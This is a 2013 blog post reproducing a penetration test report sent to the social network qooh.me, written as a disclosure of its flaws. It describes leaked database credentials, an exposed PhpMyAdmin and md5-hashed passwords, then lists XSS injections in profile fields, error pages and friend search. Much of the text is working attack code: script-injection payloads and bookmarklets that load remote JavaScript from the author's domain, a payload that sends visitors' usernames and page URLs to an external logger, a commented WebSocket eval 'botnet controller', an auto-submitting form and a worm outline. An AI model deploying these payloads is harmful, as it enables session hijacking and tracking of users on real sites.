---
title: Penetration test report for qooh.me
author: DarkFox
date: 2013-06-01
---

The following is an email sent to qooh.me explaining all vulnerabilities found
in the process of penetration testing. The whole service needs a re-write and
I will soon be granted access to work with the developers for qooh.me 2.0.
I have heavily focused on XSS attacks throughout my testing.

Due to the fact that the service has been patched, my profile no longer has the
ability to run my code. You can get the expected result by running the following
javascript on the page or by manually adding in the `<script>` tag.

``` html
<script src=http://darkfox.hackerhaven.net/exploits/qooh.me/qooh.js></script>
```

You can bookmark the following so when you're on the site you can play with the
expected result. [Qooh.me exploit][qooh.js]

``` javascript
javascript:
  (s=document.createElement("script")).src="//darkfox.us.to/e/a.js";
  void(document.body.appendChild(s))
```

---

From here until the end of the document is the pentest report. If you notice any
typos or have any suggestions to improve how this reads please check out my
[contact](/contact/) page and tell me.

    From:    James McGlashan
    To:      Qooh.me Team
    Subject: [Pentest report] http://qooh.me
 
Hello Qooh.me,

After communicating through multiple channels, I have decided to conclude
all vulnerabilities for your social network into this report. Due to the number
of different vulnerabilities, I may have forgotten to include one or two.

I will begin with the most critical problem which is the public access to
PhpMyAdmin and the MySQL database password being leaked through an overload.
Next, I'll be talking about each and every XSS injection I used to "pimp" my
profile just for you and the developers.

<!--more-->

PhpMyAdmin
==========

PhpMyAdmin is a commonly used and often mis-configured web-based client to
MySQL, one of the most commonly used databases in use today.

During a server overload; when MySQL gave up on the number of requests; the
login credentials were made public to anyone who attempted to use the service.
I suspect that this overload was caused by an attacker who discovered a SQL
injectable field or just caused a basic DOS by requesting a resource hungry
page. After noticing the credentials; I checked if PhpMyAdmin was installed and
public. Sure enough, it was and let me in.

Has the password been changed? â€” Patched alone doesn't mean that the database
can't be attacked through other methods.

Passwords in the current database are stored in an insecure way; md5. These
passwords are by no means safe. I was able to read the database through
PhpMyAdmin; who knows how many others had access to the over half a million
user's password hashes and email addresses. The following article shows how
passwords should be managed and I intend to implement the "Impossible-to-crack
Hashes" when we work on the re-write of network.

  <http://crackstation.net/hashing-security.htm>

I also suggest that you don't use a PhpMyAdmin generated password as this is
a well known pattern which is by no means resistant to brute force attacks.

There should be a network wide notification about the problem and all users
should be told that their passwords are; however unable to be confirmed; public
and they should change their passwords on any network they use the same or
similar password on. Maybe also provide the user with the following comic from
xkcd.

  <https://xkcd.com/936/>\
  <https://sslimgs.xkcd.com/comics/password_strength.png>

Cross Site Scripting (XSS) Vulnerabilities found
================================================

Throughout the time, I have discovered quite the number of vulnerable pages and
different things that can be exploited in multiple ways.

Vulerable pages
---------------

Most of the vulnerabilities are through user set and have no subset of
characters permitted allowing the attacks to run.

### Account settings

- Username
- Name

### Profile settings

- Email
- Headline
- Location
- Photo
- Website

### Other pages

- Error pages
- Find friends

All the XSS links
-----------------

All of the XSS attacks are all kept in the one place to remove complexity.

  <http://darkfox.us.to/exploits/qooh.me/>\
  <http://darkfox.us.to/exploits/qooh.me/mobile.html>

Every time I was focusing on getting my code to run, my code in `/e/a.js` is as
follows.

``` javascript
/* 
 * http://qooh.me/
 *
 * The exploit tells me if a user is logged into the social network and sends me
 * their username, not using any APIs as this is done through injection onto the
 * page. There are no limits to what can be done on the user's account. Only to
 * what is "truely" limited to the user's browser.
 * 
 * The exploit sends the messages through two methods.
 *
 * - Tell the above frame the username in a message via postMessage.
 * - Make a request to a logger, logging the username, ip address, and user agent
 *   of the browser and the timestamp that they visited the page.
 *
 * <script src=//darkfox.us.to/e/a.js></script>
 *
 * Symlink /e/a.js -> /exploits/qooh.me/qooh.js
 *
 * Copyright (c) DarkFox, 2013.
 *
 */

"use strict";

(function () {

    // Don't re-run per multiple injection.
    if (typeof window.owned == "boolean") return

    window.owned = true;
    var l, u, x;

    // Define s helper to set multiple attributes in a monadic way.
    function s () {
        this.setAttribute.apply(this, arguments);
        return this
    }

    // Grab the username of the user from their navigation menu / profile link.
    u = document.querySelector("li:nth-child(2) a")
                .getAttribute("href")
                .slice(1);

    // Depending on the user, do different things.
    switch (u) {
        // Don't log my own user
        case "DarkNFoxy":
        case "DarkNFoxyMobile":
            console.log("Logger disabled for this user");
            break;
        default:
            /* Don't send if we've been redirected through my autosubmitting
             * form.
             */
            if (location.href ==
                "http://m.qooh.me/account/find_people/#redirect")
              break;

            /* Send an XHR to my logger to keep track of the user's username,
             * current page, ip and user agent.
             */
            (x=new XMLHttpRequest() || ActiveXObject("Microsoft.XMLHTTP"))
                .open("POST",
                      "http://darkfox.hackerhaven.net/exploits/.php",
                      1);

            /* Because we are sending our requested data through a POST in the
             * urlencoded format we need to tell the server how to expect the
             * information so that it can log as expected.
             */
            x.setRequestHeader("Content-type",
                               "application/x-www-form-urlencoded");
            x.send((function(j){
                var a = [];
                for (var k in j)
                a.push(escape(k) + "=" + escape(j[k]));
                return a.join("&");
              })({ c: u == "DarkNFoxy" ? document.cookie : "disabled"
                 , u: u.indexOf("user/") == 0 ? "user is a guest" : u
                 , a: location.href
                 }));
            /* Above we send a few things.
             *
             * - In the impossible case that the username is my username, log
             *   the cookie, if not send "disabled" as a placeholder.
             *   | Impossible because the case above catches "DarkNFoxy" and
             *     disables the logging.
             *
             * - The user's username provided from the navigation.
             *
             * - The address that the user is currently viewing that caused the
             *   exploit to run.
             *
             */
    }

    // Custom theme, I'd like a DarkFox for my background. :-)
    (l = document.createElement("link")).s = s.bind(l);
    l.s("rel",  "stylesheet")
     .s("type", "text/css")
     .s("href", "http://darkfox.us.to/exploits/qooh.me/darkfox.css");
    document.body.appendChild(l);

    // If the user is not in my iframe, give them a little audio.
    if (top == window || 
            (location.href ==
               "http://m.qooh.me/account/find_people/#redirect" &&
             typeof top.location.href == "string"
            ))
        addEventListener("load", function () {
            var a = new Audio;

            a.src      = "http://darkfox.us.to:8000"
            a.autoplay = a.loop = a.controls = true;
            
            (document.querySelector(".profile-info span:nth-child(3)")
                || document.body)
              .appendChild(a);
        });
    else top.postMessage(u, "http://darkfox.us.to/");

 /*
  * Botnet controller to do anything and send any payload to any user, either
  * automatic or manual.  Concept only, any message that comes from the server
  * to the client would be execuited in the client's browser. Very modular and
  * simple to manage. In some cases this would require being in the outer frame
  * and wrapping the concept through another domain. XSS working and ignoring
  * all filters.
  *
  * WebSocket("ws://0x45a4dbd0:6120")
  *    .addEventListener("message",function(e){this.send((0,eval)(e.data))});
  */
})();
```

Username
--------

The username field can be anything you like. For example `logout.php` or
`DarkFox>` which would become unroutable due to apache taking the `>` for
a `404` instead of the requested user.

Due to the limitation for the length that the username can be, it was a little
tricky to get a good exploit as the smallest I can get to work breaks the page
as it can't close the script tag.

``` html
<script src=//ln-s.net/-COx>
```

As this breaks the page with it's `</script>` I had to tell the browser how to
re-add the removed content. This is what I did.

``` javascript
document.write("</script>DarkNFoxy" +
        document.querySelector("script[src='//ln-s.net/-COx']")
                .textContent.replace(/\<script/g,"DarkNFoxy"));
(s=document.createElement("script")).src="//darkfox.us.to/e/a.js";
document.body.appendChild(s)
```

Name
----

Effective method to get the exploit to run in multiple places. At first I was
unable to figure out a way to get code to run without breaking the normal
profile page. Using the field to produce an iframe was a success.

``` html
<iframe src=//darkfox.us.to/e/c style=display:none></iframe>
```

This, however, isn't the key to the vulnerability used; but a mix of three as the
dependant vulnerabilities are done through the find_friends page and/or photo
exploits.  Without being the part that runs the code, it aids the code in
running in a more convenient place, the user's profile.

Email
-----

I am unsure for if the email was ever visible on the page, but I do know that
I can put anything I like in that email field and it doesn't care. For reference
the following email is valid to the RFC definition.

``` html
"<script src=//darkfox.us.to/e/a.js></script>"@example.tld
```

Headline
--------

The first place I checked to see if the site was vulnerable to XSS (surprisingly
not the questions themselves) at first I sent myself my own cookies.

After this, I noticed the length limitation on the headline field and decided to
use JavaScript to get rid of such limitation.

I later targeted the exploit to understand if the user was logged in or not and
get their user name if they were, send it to my logging script. Later again,
decided to let the injection work together with a page on my domain to prove an
attack from a remote domain; giving any information up to whoever asked for it.

Location
--------
 
The location field could in theory be included into the metadata sent to
Facebook which would allow the data to be manipulated. As of current qooh.me
doesn't do such interaction, however, the field like the rest is not sanitized
and in my example, I just made it alert 'xss' to the user.

Photo
-----

The photo isn't always vulnerable, it will work in only the selected areas.

- The user's own profile settings

- When another user sees their inbox with a message sent from the attacker

- Desktop site, the mobile doesn't fall vulnerable because the desktop site only
  falls vulnerable at the view larger link.

- In find friend search results

- Tag list

The injection doesn't work when answered. Only when the above are met. The
username can be used to still work when the user has answered the question,
making their profile injected.

``` html
"><script src=http://darkfox.us.to/e/a.js></script><span style="display:none
```

The image it's self can be requested in an ugly way, just like with the error
pages as shown later in this document. It also doesn't work in chromium due to
the request containing the attack vector. The following could be in an
`<iframe>` and alone it would run the code on the domain.

``` html
http://m.qooh.me/user.php
  ?module=userprofile
  &action=profile_pic
  &profile=DarkNFoxy
  &url="><script src=http://darkfox.us.to/e/a.js></script>
    <span style=display:none>
```

Website
-------

Two vulnerabilities here, first requires the user to click the link; the second
doesn't require the user to do a thing. Both require the desktop view.

``` javascript
javascript:(s=document.createElement("script")).src="//darkfox.us.to/e/a.js";
document.body.appendChild(s);void(0)
```

``` html
"><script src=http://darkfox.us.to/e/a.js></script><span style="display:none
```

Error pages
-----------

Error pages often show their requests in the output "raw" so the basic XSS
attack below is well known and even chromium prevents such attacks as it
understands that the XSS vector is in the request andâ€¦ the only reason it would
be in the request is if it were to be malicious.

``` html
http://qooh.me/lib/
  ?user=<script src=//darkfox.us.to/e/a.js></script>
```

Find Friends
------------

If a user attempts to do a search for their friends who happen to match the name
of an attacker, they could cause code to through the results. This depends on
the exploitation through either the username or photo.

The user's request can be easily automated with an auto submitting form
/ redirect. This would be most ideal inside an iframe.

``` html
<!doctype html>
<head><title>Redirecting...</title>
<body onload="document.getElementsByTagName('form')[0].submit()">
  <form action=//m.qooh.me/account/find_people/#redirect method=post>
    <input name=keyword value=darknfoxy />
    <input type=submit />
  </form>
```


  <http://qooh.me/account/find_people/>

Annoying bugs found
===================

Throughout the penetration test, I discovered multiple and annoying bugs that
prevented me from doing what I had intended to do at the time.

- When attempting to put data into the database but the database doesn't have
  the space for the length of data, the php page will not understand the error
  and the server returns a "500 Internal Server Error" and give the user nothing
  to display about the error.

- On the desktop site, you can't post the form for the `/settings/account` page.
  Works fine on the mobile.

- Desktop site has an extra field for a "bio", this field not even when filled
  comes into use on the network.

- When injecting into the name field; I discovered that you can break the whole
  page by including `</script>` which will present the users with some ugly
  javascript.

- Skins are broken, I decided to patch this for my profile and anywhere I can
  get my code to run. This leaves a signature saying that it worked, giving the
  user the background of my DarkFox symbol.

``` html
<link rel=stylesheet type=text/css
href=//darkfox.us.to/exploits/qooh.me/darkfox.css>
```

Potential for a worm virus
==========================

Finally; after covering the large number of XSS attacks and other bugs;
I thought that I could shed a little light for how a worm virus would work for
qooh.me and how exactly it could; very quickly; spread.

A worm is a virus; living in a way. It wants to spread and run as many times as
it can on as many different computers as it can. A programmer must create it and
they have to understand enough about how the network is vulnerable and how to
exploit them in an automated fashion. Below I'll explain the steps that a worm
would have to begin and end it's life.

1. First the author of the worm has to find vulnerabilities that would let the
   worm run everywhere.

2. After vulnerabilities are found, the worm needs to be able to use them to
   replicate it's self. The author adds in automation for such.

3. The worm exists, but a virus will die without a host. The author decides to
   host the worm on his new profile.

4. Either the worm or the author will take the next step, which is asking for
   people to see the page while being logged in. They might send random people
   questions or share their profile link on a network like Facebook.

5. The code runs on people's browsers, it replicates.

6. Return to step 5â€¦ infinitely until the developers manually remove the virus
   or the network crashes due to too much traffic.

7. Who said life can't be created on a computer?


Cheers, DarkFox.

 [qooh.js]:
 javascript:(s=document.createElement("script")).src="//darkfox.us.to/e/a.js";void(document.body.appendChild(s))
